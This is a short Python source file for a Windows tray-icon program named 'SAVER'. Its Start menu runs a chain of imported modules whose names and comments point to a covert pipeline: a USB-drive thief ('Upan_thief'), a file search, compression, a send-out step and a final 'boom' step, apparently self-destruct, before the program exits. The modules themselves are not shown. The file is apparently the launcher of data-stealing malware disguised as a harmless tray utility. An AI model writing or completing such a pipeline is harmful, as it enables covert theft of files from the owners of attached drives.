import pystray
from PIL import Image
from pystray import MenuItem as item
import win32api
import time
import os
import sys

icon = pystray.Icon('SAVER')
image = Image.open('bigblack.ico')
icon.icon = image

def setup(icon):
    """显示托盘图标"""
    icon.visible = True

def Start():
    """从右键菜单主程序"""
    # 第1步对接 <Upan_thief -- tuopan>
    import Upan_thief
    Upan_thief.upan_thief()

    # 第2步对接 <search -- tuopan>
    if Upan_thief.sign_1 == True:
        import search
        search.search()

    # 第3步对接 <yasuo -- tuopan>
    if search.sign_2 == True:
        import yasuo
        yasuo.yasuo()

    # 第4步对接 <fashe -- tuopan>
    if yasuo.sign_3 == True:
        import fashe_check
        if fashe_check.sign_4 == True:
            import fashe_final

    # 第5步对接 <boom -- tuopan>
    if fashe_check.sign_4 == True:
        import boom
        win32api.PostQuitMessage(0)
        sys.exit()
        

def Exit():
    """从右键菜单退出"""
    time.sleep(0.5)
    win32api.PostQuitMessage(0)
    sys.exit()

#菜单的设置
menu = (item('Start', Start),
        item('Exit', Exit))
icon = pystray.Icon("name", image, "SAVER", menu)
icon.run(setup)
